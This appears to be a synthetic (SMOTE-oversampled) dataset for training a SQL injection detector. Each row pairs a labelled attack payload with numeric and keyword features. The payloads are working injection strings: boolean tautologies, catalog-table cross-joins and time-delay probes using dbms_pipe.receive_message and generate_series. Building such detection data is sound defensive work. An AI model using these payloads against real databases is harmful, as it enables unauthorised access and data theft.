id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000428,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,0.8358520950771717,141.68074899961803,32.94679149993634,4.264126206761177,71.20918016651814,16.315597166645446,38.89358299987268,15.262388666581787,0.5029830415237213,0.11535662866070913,0.2743191164532475,0.10734121336232191,0.3155971666454467,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.315597166645446,0.0,0.0,2.3155971666454467,5.0,0.3155971666454467,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000429,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,0.6245519774966218,81.7952150347087,23.113602147815527,3.2942021051947914,18.34080644344659,13.0,38.22720429563106,12.227204295631058,0.2240869039414165,0.15904351915667603,0.46747830760762976,0.14939126929427768,0.4544085912621174,3.545591408737883,0.0,0.0,0.8863978521844708,1.1136021478155294,0.0,6.0,0.0,0.1136021478155293,0.11360214781552913,2.0,0.11360214781552924,0.8863978521844706,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000430,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,0.48230608734426667,138.3581332861692,33.11579769952308,4.219429630927276,72.27377469475383,9.81058389666153,38.38957239427691,17.884202300476925,0.522923763345698,0.0702441565706316,0.27693501994756653,0.12989706013610386,0.0,1.0,2.0,0.0,1.0,1.1157976995230756,0.0,5.115797699523076,0.8842023004769244,0.0,2.8842023004769244,4.115797699523076,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.11579769952307564,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1157976995230756
SMOTE_000431,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000029,2.1739667054178624,143.4040637421184,36.24658073622136,4.1136478419531,57.92457932479023,19.493161472442726,47.36303257677477,18.62329036811068,0.3997381918483599,0.13712568883970835,0.3326633934928535,0.13047272581907826,2.8698711043320446,1.1102230246251565e-16,0.7534192637786368,0.0,1.0,2.0,0.0,6.869871104332045,0.0,0.6232903681106816,1.7534192637786368,5.0,1.0,0.0,0.37670963188931833,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.6232903681106818,0.0,1.0,1.0,0.6232903681106816,0.3767096318893184,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.623290368110681
SMOTE_000432,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,1.7403834512155536,142.66171856951462,32.969247142683145,3.7664141941514906,52.04241821311124,10.77306464298764,56.42311785670787,23.42311785670787,0.359356021795618,0.078656125698049,0.3991805640101328,0.16280728849620021,0.2576882143292132,2.2269353570123602,0.5153764286584263,0.0,0.2576882143292132,1.0,0.0,11.22693535701236,0.0,1.742311785670787,1.0,6.22693535701236,0.2576882143292132,0.7423117856707868,0.2576882143292132,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.7423117856707868,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000433,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,0.06557646498685651,136.44568104819822,32.07428017469971,4.243149074924378,69.17332040763264,16.024760058233234,37.14856034939941,14.09904023293294,0.5070101023258384,0.11746736397768087,0.2722361539693939,0.10328637972708674,0.024760058233235016,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.024760058233236,0.0,0.0,2.024760058233235,5.0,0.02476005823323496,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000434,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,1.6105734476631746,128.70831305981693,31.689231887461858,4.229791458616379,71.52430724501525,7.42707826495423,33.3298492848932,16.42707826495423,0.5604598765986025,0.056274991540238156,0.2565446826991896,0.12672044916196973,0.7864608675228849,0.7378463774923717,1.4756927549847434,0.0,1.0,1.0,0.0,4.2135391324771145,0.7378463774923716,0.0,2.737846377492372,3.475692754984743,0.26215362250762836,0.7378463774923716,0.7378463774923716,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.2621536225076283,0.7378463774923716,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000435,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,1.451434188030869,82.84804840877894,23.26400691553985,3.3103581561890074,18.79202074661954,13.0,38.5280138310797,12.528013831079694,0.22655566906820454,0.15712336850250758,0.4652838497171515,0.15103711271213635,1.0560276621593871,2.943972337840613,0.0,0.0,0.7359930844601532,1.2640069155398468,0.0,6.0,0.0,0.2640069155398468,0.2640069155398468,2.0,0.2640069155398468,0.7359930844601532,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000436,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,1.33270581923068,93.10827508178795,25.393165931396712,3.413791573645178,23.554137540893976,13.0,42.08974889709507,14.464388643798904,0.25077379409928957,0.14086698594387984,0.4524345970736413,0.15592462288318928,3.303417034301644,1.1102230246251565e-16,0.4643886437989041,0.0,0.23219432189945216,1.7678056781005478,0.0,6.696582965698356,0.0,1.0,1.0,2.4643886437989044,1.0,0.0,0.23219432189945213,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.23219432189945222,0.0,0.0,0.23219432189945216,1.7678056781005478,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.232194321899452
SMOTE_000437,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000029,0.9030150188547265,137.0,36.36141817551863,3.9406979098609347,46.600886359699146,20.36141817551863,51.27716364896274,18.760531815819487,0.34015245518028575,0.14862349033225278,0.3742858660508229,0.13693818843663857,4.0,1.1102230246251565e-16,0.0,0.0,0.9201772719398286,2.0,0.0,8.159645456120343,0.0,0.9201772719398287,0.9201772719398287,4.760531815819486,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.07982272806017124,0.0,1.9201772719398287,0.0,0.9201772719398289,0.9201772719398286,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.07982272806017124,0.07982272806017124,4.920177271939829
SMOTE_000438,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,0.02475240896654782,136.1682262009069,32.02803770015115,4.242037301979996,69.06542130035268,16.009345900050384,37.0560754003023,14.037383600201533,0.5072235336604941,0.1175792314358452,0.2721257584514686,0.10307147645219211,0.009345900050383271,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.009345900050384,0.0,0.0,2.0093459000503833,5.0,0.00934590005038316,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000439,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,0.45711864559915766,81.58202941103984,23.083147058719977,3.290930706422626,18.249441176159934,13.0,38.16629411743995,12.166294117439953,0.22358700980222182,0.159432325709383,0.46792265795358057,0.14905800653481455,0.3325882348799081,3.6674117651200917,0.0,0.0,0.916852941280023,1.083147058719977,0.0,6.0,0.0,0.08314705871997696,0.08314705871997696,2.0,0.08314705871997696,0.9168529412800228,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000440,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,0.0076728747916073505,87.93744445480958,23.995531746772112,3.390485931871357,21.0,13.0,39.946380961265355,13.991063493544225,0.23883809374216816,0.14785215326896123,0.45420512076151226,0.15910463222735838,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,5.9910634935442255,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000441,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000028,3.351709305654775,133.53471985185308,30.44652801481469,3.813641029110492,57.13887940741238,11.125696103702833,45.48403228147912,19.786112059258762,0.4228974959994297,0.08441283421060723,0.343750669176039,0.14893900061392398,4.89305602962938,1.1102230246251565e-16,0.0,0.44652801481469045,0.5534719851853096,2.0,0.0,6.679168088888143,2.0,0.0,1.5534719851853096,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5534719851853096,0.0,0.0,0.5534719851853096,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.106943970370619
SMOTE_000442,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,0.29779681650774564,133.8366601076353,32.75763752242403,4.237528577552459,71.0969449910304,8.709165026908828,36.321385062787265,17.709165026908828,0.5323112917015012,0.06474523441201027,0.2708328701697547,0.1321106037167338,0.14541748654558573,0.9515275044848047,1.9030550089696092,0.0,1.0,1.0,0.0,4.854582513454414,0.9515275044848047,0.0,2.9515275044848046,3.903055008969609,0.04847249551519528,0.9515275044848046,0.9515275044848046,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.04847249551519517,0.9515275044848046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000443,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000001,1.142665771537712,66.16997168613779,24.292492921534446,3.5094658753456693,22.537535392327765,6.924929215344471,26.56126061769833,10.146246460767223,0.3432793424729184,0.10061970753484496,0.4027171137249044,0.1533838362673323,0.0,0.14624646076722359,2.146246460767223,0.0,0.8537535392327764,2.0,0.0,2.146246460767223,0.0,0.14624646076722353,0.14624646076722359,5.853753539232777,0.0,0.14624646076722359,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8537535392327764,0.0,1.0,0.8537535392327764,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7075070784655533
SMOTE_000444,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,0.5344504830542679,158.25969904869018,37.424569084413875,4.005182569158203,50.56142271103469,22.280711355517344,56.424569084413875,28.992995897724285,0.3188241374105348,0.14026386989191555,0.35858458731199255,0.1823274053855571,2.8561422711034687,1.1102230246251565e-16,2.0,0.0,0.07192886444826563,1.9280711355517344,0.0,10.856142271103469,0.0,1.9280711355517344,1.0,11.424569084413875,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9280711355517341,1.0,0.0,0.9280711355517344,0.07192886444826563,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000445,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,1.7642204971378757,123.23289518709386,31.072937447602204,3.704695565848422,45.94818681882866,11.569416736530393,48.2847083682652,17.430583263469607,0.3596071678468862,0.09781126800161552,0.40048893360182886,0.14209263054966945,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,8.284708368265196,0.35764581586740163,0.6423541841325984,1.7152916317348033,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.6423541841325984,0.3576458158674016,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000446,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,0.7585585233137161,158.71841493713345,33.81787637714253,4.09905485974251,79.99664014856785,14.72513463999773,46.814516525710395,17.182123622857468,0.504721723555564,0.0919343921393628,0.29428086622840854,0.10906301807666467,0.0,1.0,2.0,0.0,1.0,1.8178763771425328,0.0,5.817876377142532,0.18212362285746733,0.0,2.182123622857467,4.817876377142532,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8178763771425328,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8178763771425324
SMOTE_000447,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,1.3038203332933338,89.46618706505737,22.53381293494264,3.038154155092169,11.469784077127173,15.199280597586036,45.864748260229426,16.932374130114717,0.12885745838648824,0.16975710362901839,0.512304338926502,0.18908109905799142,4.0,1.1102230246251565e-16,0.7330935325286787,0.0,0.0,2.0,0.0,7.466187065057357,1.4661870650573574,0.2669064674713213,1.0,2.7330935325286787,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2669064674713213,0.7330935325286787,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000448,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,0.8588115349328053,88.46056288435045,23.692958077099696,3.3376647514700037,20.539437115649545,13.0,40.92112576870091,14.0,0.23236746323748758,0.1469796057072233,0.4623672018321256,0.15828572922316353,3.3859161541993923,0.6140838458006077,0.0,0.0,0.15352096145015187,1.8464790385498482,0.0,6.307041922900304,0.0,0.8464790385498481,0.8464790385498481,2.0,0.8464790385498481,0.15352096145015187,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000449,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,1.480776272192989,141.89859981532592,32.44929990766296,4.161106262617388,69.44929990766296,16.0,41.0,15.449299907662965,0.48942855228502646,0.11276210895971756,0.2889529042092762,0.10885643454597972,0.0,0.4492999076629648,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.4492999076629647,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.4492999076629648,0.5507000923370353,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000450,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,0.9566124862898858,151.1820141847438,35.33152774297132,4.260342006408113,71.19284772691589,17.663055485942635,44.16034710039961,18.16576387148566,0.46856884405652277,0.1175000617923273,0.2934338251738344,0.12049726897731554,1.497291614456978,1.1102230246251565e-16,1.6684722570286814,0.0,1.0,2.0,0.0,5.497291614456978,0.0,0.16576387148565935,2.6684722570286814,5.0,1.0,0.0,0.8342361285143407,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1657638714856593,0.0,1.0,1.0,0.1657638714856592,0.8342361285143406,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.165763871485659
SMOTE_000451,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,4.8680031173821625,113.9320352093387,29.0,3.4938902323961236,36.37366712422895,13.0,50.80890123541817,13.74946684969158,0.3216276548986573,0.11769187517325097,0.4392719849023673,0.1214084850257244,2.312100137268685,1.1102230246251565e-16,0.0,0.0,0.562633287577105,1.437366712422895,0.0,8.312100137268684,0.0,0.562633287577105,0.5626332875771051,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.43736671242289504,0.0,1.0,0.0,0.0,0.562633287577105,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.43736671242289504,0.43736671242289504,3.4373667124228953
SMOTE_000452,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,3.2523142402618377,127.40119362248551,31.70699945021427,3.7476619634549584,46.617797031157046,11.375800329871439,49.82799780085707,19.57959846059995,0.3602861417120901,0.09725793523913329,0.3937257330631321,0.14873018998564455,0.4586001099571466,1.6241996701285604,0.0,0.0,0.4586001099571465,1.0,0.0,9.706999450214267,0.0,1.5413998900428536,1.0,4.706999450214267,0.4586001099571465,0.5413998900428535,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5413998900428534,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000453,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,0.5381427051231541,93.4666470759573,28.591394689670533,3.6012140317061654,31.34623150347285,12.264510441406957,38.019347255209276,11.836557875868213,0.3362669099203141,0.1293792612800678,0.4069964904707942,0.12735733832882384,0.9182789379341063,1.1102230246251565e-16,0.16344212413178738,0.0,1.0,1.0817210620658937,0.0,6.5913946896705315,0.0,0.9182789379341063,0.9182789379341063,2.3268842482635748,0.9182789379341063,0.0,0.08172106206589375,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.08172106206589363,1.0,0.9182789379341064,0.08172106206589386,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0817210620658937
SMOTE_000454,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,0.0812423237770211,136.65105850492392,32.0,4.227898776163577,69.0,16.0,37.52084680393915,14.130211700984788,0.505010271337101,0.11710383103469008,0.2744965582318282,0.10338933939638068,0.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.130211700984788,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000455,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,0.5092349487996207,109.57276266853924,28.09514915543072,4.14702927091915,69.09888462734061,3.951491554307168,24.52238648689147,12.0,0.6267984721125603,0.03734020969617849,0.22614596083601263,0.10971535735524861,2.809701689138566,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,2.475745777153585,0.0,0.09514915543071689,1.904850844569283,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
